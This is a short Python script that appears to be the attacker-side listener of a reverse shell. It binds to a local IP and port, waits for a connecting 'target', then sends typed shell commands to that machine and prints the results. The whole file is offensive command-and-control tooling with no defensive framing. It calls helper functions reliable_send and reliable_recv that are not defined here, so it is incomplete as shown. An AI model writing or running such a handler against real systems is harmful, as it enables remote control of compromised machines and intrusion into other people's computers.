import socket

def target_communication():
    while True:
           command = input('* Shell~%s: ' % str(ip))
           reliable_send(command)
           if command == 'quit':
               break
           else:
               result = reliable_recv()
               print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.12', 5555))
print('[+] Listening For the incoming connection...')
sock.listen(5)
target, ip = sock.accept()
print('[+] Got a connection from: ' + str(ip))
target_communication()
